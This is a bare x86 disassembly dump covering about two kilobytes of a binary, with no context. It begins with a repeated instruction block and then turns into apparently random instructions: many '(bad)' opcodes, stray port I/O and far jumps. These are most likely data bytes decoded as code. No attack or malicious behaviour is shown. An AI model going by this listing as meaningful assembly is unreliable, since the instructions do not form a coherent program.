  421bea:	inc    ebx
  421beb:	or     DWORD PTR [esi],edi
  421bed:	scas   al,BYTE PTR es:[edi]
  421bee:	xor    al,0x90
  421bf0:	loop   0x421c38
  421bf2:	mov    ebp,0xa08b4b04
  421bf7:	inc    ebx
  421bf8:	or     DWORD PTR [esi],edi
  421bfa:	scas   al,BYTE PTR es:[edi]
  421bfb:	xor    al,0x90
  421bfd:	loop   0x421c45
  421bff:	mov    ebp,0xa08b4b04
  421c04:	inc    ebx
  421c05:	or     DWORD PTR [esi],edi
  421c07:	scas   al,BYTE PTR es:[edi]
  421c08:	xor    al,0x90
  421c0a:	loop   0x421c52
  421c0c:	mov    ebp,0xa08b4b04
  421c11:	inc    ebx
  421c12:	or     DWORD PTR [esi],edi
  421c14:	scas   al,BYTE PTR es:[edi]
  421c15:	xor    al,0x90
  421c17:	loop   0x421c5f
  421c19:	mov    ebp,0xa08b4b04
  421c1e:	inc    ebx
  421c1f:	or     DWORD PTR [esi],edi
  421c21:	scas   al,BYTE PTR es:[edi]
  421c22:	xor    al,0x90
  421c24:	loop   0x421c6c
  421c26:	mov    ebp,0xa08b4b04
  421c2b:	inc    ebx
  421c2c:	or     DWORD PTR [esi],edi
  421c2e:	scas   al,BYTE PTR es:[edi]
  421c2f:	xor    al,0x90
  421c31:	loop   0x421c79
  421c33:	mov    ebp,0xa08b4b04
  421c38:	inc    ebx
  421c39:	or     DWORD PTR [esi],edi
  421c3b:	scas   al,BYTE PTR es:[edi]
  421c3c:	xor    al,0x90
  421c3e:	loop   0x421c86
  421c40:	mov    ebp,0xa08b4b04
  421c45:	inc    ebx
  421c46:	or     DWORD PTR [esi],edi
  421c48:	scas   al,BYTE PTR es:[edi]
  421c49:	xor    al,0x90
  421c4b:	loop   0x421c93
  421c4d:	mov    ebp,0xa08b4b04
  421c52:	inc    ebx
  421c53:	or     DWORD PTR [esi],edi
  421c55:	scas   al,BYTE PTR es:[edi]
  421c56:	xor    al,0x90
  421c58:	loop   0x421ca0
  421c5a:	mov    ebp,0xa08b4b04
  421c5f:	inc    ebx
  421c60:	or     DWORD PTR [esi],edi
  421c62:	scas   al,BYTE PTR es:[edi]
  421c63:	xor    al,0x90
  421c65:	loop   0x421cad
  421c67:	mov    ebp,0xa08b4b04
  421c6c:	inc    ebx
  421c6d:	or     DWORD PTR [esi],edi
  421c6f:	scas   al,BYTE PTR es:[edi]
  421c70:	xor    al,0x90
  421c72:	loop   0x421cba
  421c74:	mov    ebp,0xa08b4b04
  421c79:	inc    ebx
  421c7a:	or     DWORD PTR [esi],edi
  421c7c:	scas   al,BYTE PTR es:[edi]
  421c7d:	xor    al,0x90
  421c7f:	loop   0x421cc7
  421c81:	mov    ebp,0xa08b4b04
  421c86:	inc    ebx
  421c87:	or     DWORD PTR [esi],edi
  421c89:	scas   al,BYTE PTR es:[edi]
  421c8a:	xor    al,0x90
  421c8c:	loop   0x421cd4
  421c8e:	mov    ebp,0xa08b4b04
  421c93:	inc    ebx
  421c94:	or     DWORD PTR [esi],edi
  421c96:	scas   al,BYTE PTR es:[edi]
  421c97:	xor    al,0x90
  421c99:	loop   0x421ce1
  421c9b:	mov    ebp,0xa08b4b04
  421ca0:	inc    ebx
  421ca1:	or     DWORD PTR [esi],edi
  421ca3:	scas   al,BYTE PTR es:[edi]
  421ca4:	xor    al,0x90
  421ca6:	loop   0x421cee
  421ca8:	mov    ebp,0xa08b4b04
  421cad:	inc    ebx
  421cae:	or     DWORD PTR [esi],edi
  421cb0:	scas   al,BYTE PTR es:[edi]
  421cb1:	xor    al,0x90
  421cb3:	loop   0x421cfb
  421cb5:	mov    ebp,0xa08b4b04
  421cba:	inc    ebx
  421cbb:	or     DWORD PTR [esi],edi
  421cbd:	scas   al,BYTE PTR es:[edi]
  421cbe:	xor    al,0x90
  421cc0:	loop   0x421d08
  421cc2:	mov    ebp,0x4ecc4b04
  421cc7:	dec    ecx
  421cc8:	or     DWORD PTR [ecx],edx
  421cca:	scas   al,BYTE PTR es:[edi]
  421ccb:	xor    al,0x80
  421ccd:	loop   0x421d15
  421ccf:	xchg   edi,eax
  421cd0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421cd1:	xchg   ecx,eax
  421cd2:	cli    
  421cd3:	(bad)  
  421cd4:	mov    esp,0x6429a024
  421cd9:	jge    0x421caf
  421cdb:	scas   al,BYTE PTR es:[edi]
  421cdc:	scas   al,BYTE PTR es:[edi]
  421cdd:	mov    al,0xde
  421cdf:	in     eax,dx
  421ce0:	rol    edi,1
  421ce2:	push   ebx
  421ce3:	sub    eax,0x8f86831f
  421ce8:	mov    ds:0xa58d8537,al
  421ced:	ret    0x36d3
  421cf0:	pop    es
  421cf1:	popf   
  421cf2:	jnp    0x421d15
  421cf4:	cmc    
  421cf5:	fs mov ebp,0xf503ec23
  421cfb:	adc    ah,BYTE PTR [edi+edx*4-0x64]
  421cff:	or     DWORD PTR [ebp-0xa],ecx
  421d02:	neg    ebp
  421d04:	adc    al,0x10
  421d06:	lods   eax,DWORD PTR ds:[esi]
  421d07:	mov    cl,0xac
  421d09:	pusha  
  421d0a:	lahf   
  421d0b:	ret    0x2ad3
  421d0e:	into   
  421d0f:	xor    DWORD PTR [eax],0xd0bdb550
  421d15:	mov    ss,WORD PTR [eax-0x6b02f1c4]
  421d1b:	jne    0x421d5c
  421d1d:	sbb    BYTE PTR [eax],0x3e
  421d20:	xchg   esi,eax
  421d21:	adc    ebp,ebp
  421d23:	fisub  WORD PTR [ebp-0x11258c8a]
  421d29:	cmpxchg BYTE PTR [eax-0xf],ch
  421d2d:	add    DWORD PTR [ebp+0x59d8f70b],ebp
  421d33:	or     DWORD PTR [edx-0x38f4ef79],ebx
  421d39:	aad    0x4b
  421d3b:	rcl    BYTE PTR [ebp-0x29b582be],0x79
  421d42:	xor    cl,BYTE PTR ds:0x2b60dc3e
  421d48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d49:	test   al,0x82
  421d4b:	mov    al,ds:0x9047d6ea
  421d50:	gs mov edx,0x815b9829
  421d56:	es push ebx
  421d58:	jbe    0x421cea
  421d5a:	adc    ebp,DWORD PTR gs:[esi]
  421d5d:	add    eax,0x6349ef69
  421d62:	jp     0x421ced
  421d64:	retf   
  421d65:	outs   dx,BYTE PTR ds:[esi]
  421d66:	adc    DWORD PTR [edx],0xffffffde
  421d69:	push   esp
  421d6a:	jge    0x421d2c
  421d6c:	loopne 0x421cf6
  421d6e:	xor    al,0x25
  421d70:	adc    edx,DWORD PTR [edi+0x211f9c5d]
  421d76:	adc    eax,0xacfd40a9
  421d7b:	js     0x421dab
  421d7d:	mov    BYTE PTR [ebx+0x56],dl
  421d80:	sbb    DWORD PTR [esi-0x6c],0x18
  421d84:	enter  0x82fa,0xd3
  421d88:	mov    cl,0x3e
  421d8a:	mov    ch,0x0
  421d8c:	mov    eax,0x2c453d07
  421d91:	in     eax,0x1a
  421d93:	aam    0x9f
  421d95:	xchg   ebp,eax
  421d96:	add    eax,0x75e6d361
  421d9b:	or     BYTE PTR [eax+edx*8+0x24b4deaa],ah
  421da2:	call   0x667a:0x6a725e42
  421da9:	add    edi,ecx
  421dab:	(bad)  
  421dac:	test   BYTE PTR [esi-0x24],dl
  421daf:	packssdw mm2,QWORD PTR [eax+0x1fe9e5af]
  421db6:	retf   
  421db7:	jno    0x421d3b
  421db9:	psadbw mm4,mm3
  421dbc:	cmp    DWORD PTR [ebx-0x1],edi
  421dbf:	or     ah,BYTE PTR [ebp-0x33]
  421dc2:	addr16 sub esp,esp
  421dc5:	(bad)  
  421dc6:	repz fwait
  421dc8:	shr    al,cl
  421dca:	mov    esi,0x85b10a3e
  421dcf:	lahf   
  421dd0:	pop    edi
  421dd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421dd2:	pushf  
  421dd3:	(bad)  
  421dd4:	bound  ecx,QWORD PTR ds:0x9e6807c4
  421dda:	cmp    BYTE PTR [eax-0x4b],bl
  421ddd:	inc    edi
  421dde:	jl     0x421e4c
  421de0:	sub    al,0x95
  421de2:	addr16 mov eax,ds:0x6f0
  421de6:	xor    ah,BYTE PTR [eax+0xc032341]
  421dec:	push   ebp
  421ded:	add    ah,al
  421def:	dec    ecx
  421df0:	ja     0x421e48
  421df2:	fisubr WORD PTR [ebp-0x13]
  421df5:	dec    esp
  421df6:	(bad)
  421df9:	call   DWORD PTR [eax-0x3]
  421dfc:	push   cs
  421dfd:	fstp   DWORD PTR [eax+0x7a]
  421e00:	in     al,dx
  421e01:	xor    al,0x51
  421e03:	sbb    dh,ah
  421e05:	shl    BYTE PTR [ebx],cl
  421e07:	push   edi
  421e08:	in     eax,0x12
  421e0a:	jle    0x421e62
  421e0c:	sbb    bh,0x39
  421e0f:	out    dx,al
  421e10:	cmp    WORD PTR [edx+0x7708b3b6],cx
  421e17:	sahf   
  421e18:	in     eax,0xee
  421e1a:	out    0xfa,al
  421e1c:	cmp    esp,edx
  421e1e:	fist   DWORD PTR [ecx]
  421e20:	mov    ebx,0x35baa2c3
  421e25:	push   edi
  421e26:	push   0xffffffbb
  421e28:	dec    edx
  421e2a:	mov    ds:0x8bb7417d,al
  421e2f:	loope  0x421ddc
  421e31:	xor    esi,edx
  421e33:	retf   
  421e34:	lea    si,ds:0x19509bd8
  421e3b:	mov    al,0x98
  421e3d:	pop    eax
  421e3e:	jp     0x421e75
  421e40:	fdiv   QWORD PTR [edx-0x4f0aa028]
  421e46:	pushf  
  421e47:	jb     0x421deb
  421e49:	pop    edx
  421e4a:	shl    DWORD PTR [edi-0x20dadf56],1
  421e50:	add    al,0x7e
  421e52:	hlt    
  421e53:	fbstp  TBYTE PTR ds:0x51d9f9a2
  421e59:	in     eax,dx
  421e5a:	cdq    
  421e5b:	ja     0x421e74
  421e5d:	push   0x66
  421e5f:	add    al,0x5d
  421e61:	lahf   
  421e62:	fiadd  DWORD PTR [ebx-0xb39847e]
  421e68:	lock and ecx,DWORD PTR [ebp-0xb]
  421e6c:	sub    eax,0xacc10e75
  421e71:	jge    0x421e81
  421e73:	inc    edi
  421e74:	stc    
  421e75:	sbb    al,0x89
  421e77:	mov    ebp,0xc3b5495a
  421e7c:	adc    eax,0x8cec30cb
  421e81:	inc    ebx
  421e82:	cld    
  421e83:	loope  0x421e85
  421e85:	pop    esi
  421e86:	mov    edx,0xf552b050
  421e8b:	xchg   edx,eax
  421e8c:	test   eax,0xcaaf331e
  421e91:	sbb    eax,0x624c5e93
  421e96:	jno    0x421ec7
  421e98:	rcl    BYTE PTR [edi-0x1c7ea6bc],0x2c
  421e9f:	or     DWORD PTR [edx+0xd180f15],esp
  421ea5:	push   esp
  421ea6:	xor    eax,DWORD PTR [ecx+0x5d]
  421ea9:	ja     0x421e76
  421eab:	xacquire xchg BYTE PTR [edx+ebp*2-0x11],ah
  421eb0:	mov    bl,0x10
  421eb2:	mov    WORD PTR [ebx-0xc],gs
  421eb5:	mov    ebx,0x3fb3040a
  421eba:	call   0x40f44834
  421ebf:	add    eax,0x812fb5ed
  421ec4:	leave  
  421ec5:	mov    WORD PTR [esp+ecx*2],?
  421ec8:	mov    edi,0x27924475
  421ecd:	aaa    
  421ece:	mov    esp,0xb5051e83
  421ed3:	loopne 0x421f0d
  421ed5:	or     ecx,eax
  421ed7:	sub    BYTE PTR [edx+0x3e],al
  421eda:	loop   0x421ee1
  421edc:	adc    BYTE PTR [ebp+0x5fcb8320],0x1
  421ee3:	outs   dx,DWORD PTR ds:[esi]
  421ee4:	bound  esp,QWORD PTR [ebp-0x6de41e5c]
  421eea:	icebp  
  421eeb:	out    dx,eax
  421eec:	mov    eax,0xb72974b7
  421ef1:	sbb    eax,0xdde75f1f
  421ef6:	or     bl,BYTE PTR [edi+0x74]
  421ef9:	stos   DWORD PTR es:[edi],eax
  421efa:	sub    DWORD PTR [edx],0xffffff8f
  421efd:	add    DWORD PTR [edx+eax*2+0x14],eax
  421f01:	test   BYTE PTR [ecx-0x27],ch
  421f04:	comiss xmm2,xmm1
  421f07:	pop    eax
  421f08:	xor    al,0x8e
  421f0a:	mov    ?,WORD PTR [edi]
  421f0c:	pop    eax
  421f0d:	loope  0x421f51
  421f0f:	mov    ebx,0x1f6d4df7
  421f14:	jp     0x421f91
  421f16:	cmp    BYTE PTR [ecx],ah
  421f18:	jo     0x421f2c
  421f1a:	inc    esi
  421f1b:	push   esi
  421f1c:	es inc eax
  421f1e:	test   ebx,eax
  421f20:	shl    BYTE PTR [esi+0x59],0xcd
  421f24:	sar    BYTE PTR [bx+di],0x2e
  421f28:	cmp    al,BYTE PTR [ebx+0x36]
  421f2b:	hlt    
  421f2c:	loopne 0x421f44
  421f2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421f2f:	or     al,0x70
  421f31:	fwait
  421f32:	add    BYTE PTR ds:0xea62b677,cl
  421f38:	call   0x53a17020
  421f3d:	mov    bh,0xb3
  421f3f:	mov    esp,0x98a1d238
  421f44:	sub    eax,0xdf3d4eee
  421f49:	jae    0x421f3d
  421f4b:	jp     0x421fc5
  421f4d:	sub    DWORD PTR [ecx-0x6eb1b710],esp
  421f53:	dec    ecx
  421f54:	(bad)  
  421f55:	lods   eax,DWORD PTR ds:[esi]
  421f56:	(bad)  
  421f57:	out    dx,al
  421f58:	ins    DWORD PTR es:[edi],dx
  421f59:	call   DWORD PTR [edx-0x47a55d8a]
  421f5f:	pushf  
  421f60:	psubd  mm5,mm1
  421f63:	mov    ch,0x93
  421f65:	shr    DWORD PTR [ecx+eiz*4+0x5b4e4d72],cl
  421f6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421f6d:	clc    
  421f6e:	jb     0x421f1d
  421f70:	push   ds
  421f71:	push   es
  421f72:	mov    esp,0xbf50d339
  421f77:	mov    ah,0x20
  421f79:	lods   eax,DWORD PTR ds:[esi]
  421f7a:	lds    edx,FWORD PTR [eax]
  421f7c:	cwde   
  421f7d:	xor    BYTE PTR [ebx-0x3],0x6e
  421f81:	loope  0x421fc0
  421f83:	xchg   edx,eax
  421f84:	inc    ebx
  421f85:	shl    ah,cl
  421f87:	xor    eax,0x1726bc85
  421f8c:	mov    ah,0xda
  421f8e:	mov    ax,ds:0x929492eb
  421f94:	or     BYTE PTR [edx+0x1e],0x5c
  421f98:	stos   BYTE PTR es:[edi],al
  421f99:	in     eax,dx
  421f9a:	and    ecx,DWORD PTR ss:[ecx+0x37]
  421f9e:	in     eax,0xce
  421fa0:	pop    edx
  421fa1:	mov    ecx,0x408b7405
  421fa6:	mov    cl,0xb2
  421fa8:	mov    esp,DWORD PTR [esi]
  421faa:	xchg   edi,eax
  421fab:	pop    ecx
  421fac:	loopne 0x421f9f
  421fae:	push   ebx
  421faf:	loop   0x421f72
  421fb1:	pusha  
  421fb2:	mov    esi,0xc3a37191
  421fb7:	gs out 0x8f,eax
  421fba:	xor    eax,0x11ae5eb
  421fbf:	mov    cl,0x1c
  421fc1:	test   al,0x5d
  421fc3:	popa   
  421fc4:	js     0x421fc6
  421fc6:	enter  0x8c72,0xa9
  421fca:	dec    esi
  421fcb:	ds dec ebx
  421fcd:	xor    BYTE PTR [ebx],bh
  421fcf:	mov    edx,DWORD PTR [edx]
  421fd1:	add    al,0xca
  421fd3:	jp     0x421fd9
  421fd5:	mov    edi,0xf4803673
  421fda:	mov    bh,BYTE PTR ds:0x3d222e4
  421fe0:	pop    ds
  421fe1:	mov    eax,DWORD PTR [ebp-0x80]
  421fe4:	arpl   WORD PTR [edi-0x35],di
  421fe7:	icebp  
  421fe8:	repz xchg ebx,eax
  421fea:	or     esi,ebx
  421fec:	sbb    DWORD PTR [ecx+0x58ae2a4e],edi
  421ff2:	adc    ebp,esi
  421ff4:	mov    ch,0x15
  421ff6:	mov    edx,0xb986a517
  421ffb:	xchg   ecx,eax
  421ffc:	jne    0x422034
  421ffe:	mov    BYTE PTR [ecx+0x24bba414],cl
  422004:	out    dx,al
  422005:	adc    edx,DWORD PTR [eax-0x8]
  422008:	setbe  BYTE PTR [ecx]
  42200b:	ret    0xc4c8
  42200e:	mov    eax,ds:0x446535ae
  422013:	inc    edx
  422014:	ss sub ebp,edi
  422017:	outs   dx,DWORD PTR ds:[esi]
  422018:	addr16 xor ebp,edx
  42201b:	pop    edi
  42201c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42201d:	fbstp  TBYTE PTR [eax-0x3d2c4c8d]
  422023:	imul   esp,ebx,0x2a
  422026:	pop    es
  422027:	dec    DWORD PTR [ecx+0x65c74b3a]
  42202d:	mov    ebx,DWORD PTR [eax+0x22bfdf9b]
  422033:	daa    
  422034:	retf   0x6353
  422037:	mov    esi,0xe6d000f5
  42203c:	aam    0x70
  42203e:	out    dx,eax
  42203f:	add    cl,BYTE PTR [eax+0x780e8d60]
  422045:	scas   al,BYTE PTR es:[edi]
  422046:	das    
  422047:	sar    DWORD PTR [ebx+0x7d8c9268],0x4d
  42204e:	and    al,0x1b
  422050:	mov    ds,ebp
  422052:	outs   dx,BYTE PTR ds:[esi]
  422053:	retf   
  422054:	dec    ebx
  422055:	rcl    DWORD PTR [esi+edi*8+0x18],1
  422059:	jmp    0x2908:0xf740cd7a
  422060:	fs icebp 
  422062:	ret    
  422063:	push   ds
  422064:	xor    BYTE PTR [esi],ch
  422066:	pop    edx
  422067:	ins    BYTE PTR es:[edi],dx
  422068:	mov    ch,0x4d
  42206a:	push   ebp
  42206b:	add    al,0xae
  42206d:	cs out dx,al
  42206f:	mov    ecx,0x78783f39
  422074:	push   esi
  422075:	add    eax,0xb4b3c89f
  42207a:	mov    al,0xa2
  42207c:	sbb    DWORD PTR [ebx+0x77],ebx
  42207f:	xchg   DWORD PTR [ebx+0x61],ebp
  422082:	jmp    0x68c53fa6
  422087:	pop    ds
  422088:	mov    al,0x63
  42208a:	(bad)  
  42208b:	les    esp,FWORD PTR [ebx+0x79]
  42208e:	lahf   
  42208f:	mov    dl,0xde
  422091:	sub    al,0xcd
  422093:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422094:	jo     0x4220ea
  422096:	adc    esp,edi
  422098:	push   es
  422099:	xor    esp,DWORD PTR [edi]
  42209b:	pop    ebx
  42209c:	sbb    eax,0xe0cd0966
  4220a1:	inc    ebx
  4220a2:	not    BYTE PTR [ebp+0x41]
  4220a5:	or     BYTE PTR ss:[edx+0x3c],bh
  4220a9:	xor    dh,BYTE PTR ds:0xf7b648f7
  4220af:	stc    
  4220b0:	cwde   
  4220b1:	cld    
  4220b2:	or     al,0xd4
  4220b4:	sub    cl,BYTE PTR [ecx-0x34]
  4220b7:	adc    BYTE PTR [ecx+0x10],dl
  4220ba:	rol    DWORD PTR [ebx-0x30],cl
  4220bd:	jbe    0x4220a9
  4220bf:	rcl    ebp,0xca
  4220c2:	(bad)  
  4220c4:	das    
  4220c5:	clc    
  4220c6:	dec    ecx
  4220c7:	sti    
  4220c8:	lahf   
  4220c9:	inc    esp
  4220ca:	push   esp
  4220cb:	jmp    DWORD PTR [edx]
  4220cd:	pushf  
  4220ce:	nop
  4220cf:	cmovno ebp,ebx
  4220d2:	clc    
  4220d3:	(bad)  
  4220d4:	dec    esp
  4220d5:	mov    esi,0x95ff9d6d
  4220da:	mov    eax,ds:0xc3756a02
  4220df:	sbb    eax,ebx
  4220e1:	ret    0x3180
  4220e4:	push   edx
  4220e5:	pop    ecx
  4220e6:	push   0xffffff9a
  4220e8:	pop    edx
  4220e9:	aam    0x13
  4220eb:	xor    BYTE PTR [esi],dh
  4220ed:	xchg   edx,eax
  4220ee:	mov    ds:0x38b69e65,al
  4220f3:	xor    dl,BYTE PTR [edx]
  4220f5:	dec    ebp
  4220f6:	lods   al,BYTE PTR ds:[esi]
  4220f7:	lahf   
  4220f8:	daa    
  4220f9:	pop    ebx
  4220fa:	or     cl,cl
  4220fc:	mov    ebp,?
  4220fe:	jnp    0x4220f5
  422100:	sbb    dl,BYTE PTR [eax+0x77]
  422103:	iret   
  422104:	imul   ebx,esi,0xffffffde
  422107:	mov    cx,0xbba0
  42210b:	(bad)  
  42210c:	sub    edi,esp
  42210e:	xor    DWORD PTR [ebx-0x13],0xb6226386
  422115:	bnd jg 0x422112
  422118:	lea    esp,[eax]
  42211a:	cmp    DWORD PTR [esi],esp
  42211c:	jno    0x4220b1
  42211e:	push   edx
  42211f:	cli    
  422120:	pop    ecx
  422121:	iret   
  422122:	stos   BYTE PTR es:[edi],al
  422123:	jle    0x422180
  422125:	mov    ah,0xd9
  422127:	xor    eax,0x5c229329
  42212c:	xchg   edi,eax
  42212d:	imul   ebx,DWORD PTR [edi-0x11],0x31
  422131:	push   esi
  422132:	pop    esp
  422133:	mov    eax,DWORD PTR [ebx]
  422135:	inc    dx
  422137:	dec    eax
  422138:	pop    ecx
  422139:	push   esp
  42213a:	jg     0x422142
  42213c:	dec    ebx
  42213d:	shl    DWORD PTR [eax],cl
  42213f:	lds    ebx,FWORD PTR [esi]
  422141:	lahf   
  422142:	pop    es
  422143:	outs   dx,DWORD PTR ds:[esi]
  422144:	mov    edi,0xae82019b
  422149:	push   eax
  42214a:	push   ebp
  42214b:	int    0x9e
  42214d:	ds cmc 
  42214f:	xchg   BYTE PTR [ecx-0x70131915],cl
  422155:	push   0xceb09fd4
  42215a:	sub    DWORD PTR [eax],0xb52f2964
  422160:	inc    edi
  422161:	pushf  
  422162:	mov    edx,0x603156b
  422167:	enter  0x9589,0xb8
  42216b:	in     al,0x7d
  42216d:	dec    edx
  42216e:	out    0x3a,al
  422170:	aaa    
  422171:	xlat   BYTE PTR ds:[ebx]
  422172:	pusha  
  422173:	cmc    
  422174:	mov    gs,ebp
  422176:	loope  0x422129
  422178:	lods   al,BYTE PTR ds:[esi]
  422179:	test   al,0xf9
  42217b:	jno    0x422142
  42217d:	dec    DWORD PTR [eax+0x22]
  422180:	(bad)  
  422181:	jnp    0x4221f4
  422183:	dec    ebx
  422184:	add    al,0x93
  422186:	push   esp
  422187:	or     cl,cl
  422189:	cwde   
  42218a:	xor    DWORD PTR [ebp+0x7e3cedd5],esp
  422190:	out    0x2a,al
  422192:	fdivr  st(4),st
  422194:	push   0xffffffe4
  422196:	mov    edi,DWORD PTR [eax-0x469bee65]
  42219c:	dec    ecx
  42219d:	sub    eax,0x5198098f
  4221a2:	push   edi
  4221a3:	(bad)  
  4221a5:	inc    ecx
  4221a6:	js     0x422181
  4221a8:	bound  edi,QWORD PTR [ebx-0x69562945]
  4221ae:	cmp    al,0xdf
  4221b0:	mov    fs,edi
  4221b2:	call   0x58e5:0xf2f8bd36
  4221b9:	lds    eax,FWORD PTR [ecx]
  4221bb:	xchg   ebp,eax
  4221bc:	hlt    
  4221bd:	xchg   BYTE PTR [esi],bl
  4221bf:	inc    esi
  4221c0:	or     DWORD PTR [esi+0x4a2bb987],ecx
  4221c6:	xchg   BYTE PTR [edx],al
  4221c8:	std    
  4221c9:	lds    ecx,FWORD PTR [edi]
  4221cb:	cmp    al,cl
  4221cd:	pop    ss
  4221ce:	loopne 0x42220c
  4221d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4221d1:	stos   DWORD PTR es:[edi],eax
  4221d2:	push   es
  4221d3:	outs   dx,DWORD PTR ds:[esi]
  4221d4:	push   0x316fe91e
  4221d9:	push   0xaee378a9
  4221de:	or     esi,DWORD PTR [edi]
  4221e0:	mov    al,0x43
  4221e2:	or     BYTE PTR [esp+ebp*4],bh
  4221e5:	push   es
  4221e6:	and    eax,0xdeb40dda
  4221eb:	scas   al,BYTE PTR es:[edi]
  4221ec:	sbb    edi,eax
  4221ee:	call   0x9c5b6f1
  4221f3:	inc    ebx
  4221f4:	out    0xb7,al
  4221f6:	leave  
  4221f7:	mov    al,ds:0x79f2fe72
  4221fc:	pop    DWORD PTR [edi-0x25d46d60]
  422202:	cmp    bh,bl
  422204:	fadd   QWORD PTR [ecx]
  422206:	inc    edi
  422207:	inc    ebx
  422208:	mov    cl,BYTE PTR [ecx]
  42220a:	pop    ebp
  42220b:	xchg   esi,eax
  42220c:	fistp  DWORD PTR ds:0xae460c86
  422212:	push   ds
  422213:	xchg   ecx,eax
  422214:	aas    
  422215:	pop    edx
  422216:	test   DWORD PTR [edi+0x689d7bdc],0xe01c2d0f
  422220:	push   ds
  422221:	adc    eax,0x11abc159
  422226:	mov    BYTE PTR [ecx+0x5f],dl
  422229:	test   BYTE PTR [esi-0x4f9de27e],0xe
  422230:	ficomp WORD PTR [ebp-0x5bdfb657]
  422236:	mov    eax,ds:0x2f4b42d1
  42223b:	sbb    esp,DWORD PTR [edi]
  42223d:	neg    BYTE PTR [edi+0x2d40b669]
  422243:	in     eax,dx
  422244:	inc    ecx
  422245:	int    0xa9
  422247:	mov    bh,0x10
  422249:	dec    ecx
  42224a:	leave  
  42224b:	ja     0x4221d5
  42224d:	rcr    BYTE PTR [edx+0x51],cl
  422250:	ja     0x422290
  422252:	std    
  422253:	or     al,0x54
  422255:	sub    ah,BYTE PTR ds:0x5a80773a
  42225b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42225c:	pop    esp
  42225d:	jo     0x4221f2
  42225f:	aam    0x9c
  422261:	push   0x21
  422263:	cli    
  422264:	into   
  422265:	scas   eax,DWORD PTR es:[edi]
  422266:	push   edi
  422268:	mov    edi,0xd8a638ec
  42226d:	xchg   esp,eax
  42226e:	aaa    
  42226f:	test   BYTE PTR [ebx+eiz*2+0x5f7c0bbc],0xa1
  422277:	ins    BYTE PTR es:[edi],dx
  422278:	(bad)  
  422279:	aad    0x40
  42227b:	pop    ebp
  42227c:	mov    BYTE PTR [ecx-0x5a],ch
  42227f:	mov    ebx,0x62a924e0
  422284:	push   ebp
  422285:	adc    eax,0x742cc1b5
  42228a:	inc    eax
  42228b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42228c:	pop    es
  42228d:	and    al,BYTE PTR [eax+ecx*1-0x46f4fe02]
  422294:	mov    WORD PTR [eax-0x60136874],fs
  42229a:	xchg   esi,eax
  42229b:	xchg   edi,eax
  42229c:	in     al,dx
  42229d:	mov    ds:0x1b868576,eax
  4222a2:	or     ebx,DWORD PTR [ebx+edi*8]
  4222a5:	ss dec ebp
  4222a7:	adc    al,0xbb
  4222a9:	sti    
  4222aa:	cmp    al,0x80
  4222ac:	jb     0x422329
  4222ae:	xchg   DWORD PTR [edi+0x6df7baae],esi
  4222b4:	sub    dl,BYTE PTR ds:0x88a8afa
  4222ba:	nop
  4222bb:	or     eax,DWORD PTR ds:0xf385225f
  4222c1:	mov    esp,0x6fd4503d
  4222c6:	cli    
  4222c7:	xchg   DWORD PTR [edi+0x30a2b1d7],esi
  4222cd:	cmp    eax,0xe2161ca
  4222d2:	call   0xab8f07ab
  4222d7:	cs mov al,0xc1
  4222da:	cmp    al,0x37
  4222dc:	dec    ebp
  4222dd:	mov    eax,0x511588bf
  4222e2:	hlt    
  4222e3:	dec    edx
  4222e4:	xchg   ebx,eax
  4222e5:	inc    eax
  4222e6:	mov    cl,0x48
  4222e8:	push   0xf75a4d34
  4222ed:	aas    
  4222ee:	je     0x422308
  4222f0:	daa    
  4222f1:	cmp    al,0x86
  4222f3:	add    BYTE PTR [ecx+0x577cbc61],bh
  4222f9:	mov    cs,esp
  4222fb:	ds je  0x4222ed
  4222fe:	pop    ebp
  4222ff:	test   eax,0xd51e4802
  422304:	sub    ebp,DWORD PTR [ebp-0x3fdf9e9d]
  42230a:	loope  0x4222ef
  42230c:	sahf   
  42230d:	jne    0x42237f
  42230f:	out    0xf3,eax
  422311:	es popa 
  422313:	ds cs dec edi
  422316:	outs   dx,DWORD PTR ds:[esi]
  422317:	sti    
  422318:	sub    DWORD PTR [ecx],ebp
  42231a:	mov    cl,0xee
  42231c:	sbb    ebp,DWORD PTR [ebp-0x7c7be3e5]
  422322:	cdq    
  422323:	fadd   st(1),st
  422325:	das    
  422326:	(bad)  
  422327:	xchg   edx,eax
  422328:	popf   
  422329:	push   cs
  42232a:	add    al,0x15
  42232c:	sbb    ah,BYTE PTR [edx]
  42232e:	sub    BYTE PTR [eax+0x3f],bl
  422331:	push   ss
  422332:	mov    esi,0x57830159
  422337:	pop    ds
  422338:	ds jmp 0x91ff:0x83680f32
  422340:	push   ebp
  422341:	and    al,0x1a
  422343:	mov    bl,0xa0
  422345:	enter  0x2ae4,0x7f
  422349:	imul   eax,esi,0x68
  42234c:	mov    dh,al
  42234e:	xchg   ecx,ebp
  422350:	int    0x6c
  422352:	aad    0xe2
  422354:	loope  0x4222f7
  422356:	fiadd  DWORD PTR [esi+0x55]
  422359:	int3   
  42235a:	pop    esi
  42235b:	add    al,0xdd
  42235d:	jge    0x422331
  42235f:	inc    ebp
  422360:	inc    esi
  422361:	adc    al,0xa
  422363:	jbe    0x422395
  422365:	inc    edx
  422366:	add    dh,BYTE PTR [edx+ebx*2-0x394eb5a4]
  42236d:	shr    DWORD PTR [ebp-0x42],1
  422370:	mov    dl,0xf9
  422372:	sub    esi,DWORD PTR [esi+0x78]
  422375:	cld    
  422376:	xchg   ebx,eax
  422377:	aad    0x9d
  422379:	ret    
  42237a:	and    BYTE PTR [ebx+0x3b],ah
  42237d:	mov    WORD PTR [eax-0x17],?
  422380:	(bad)  
  422381:	int3   
  422382:	inc    ecx
  422383:	adc    DWORD PTR [esi],edx
  422385:	clc    
  422386:	inc    edx
  422387:	cmp    dl,BYTE PTR [ebx-0x56]
  42238a:	loope  0x4223e9
  42238c:	sar    edx,cl
  42238e:	int    0x95
  422390:	test   eax,0xc7f51d77
  422395:	sbb    DWORD PTR [edi],0x56
  422398:	inc    edx
  422399:	(bad)
  42239c:	mov    cl,0x2f
  42239e:	sub    eax,edx
  4223a0:	das    
